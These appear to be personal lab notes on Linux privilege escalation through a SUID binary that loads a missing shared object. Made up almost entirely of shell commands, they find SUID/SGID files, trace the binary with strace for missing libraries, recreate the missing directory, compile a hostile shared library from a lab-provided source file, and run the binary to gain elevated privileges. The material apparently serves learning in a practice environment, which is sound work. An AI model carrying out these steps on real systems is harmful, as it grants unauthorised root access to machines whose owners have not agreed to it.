```Shell
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```




suid-so elevation process:

```shell
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
```

find any missing file that is accessable to the current user and create the same file
EXAMPLE
```Shell
mkdir /home/user/.config
```

copy from /home/user/tools/suid/libcalc.c
```Shell
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```

execute
```Shell
/usr/local/bin/suid-so
```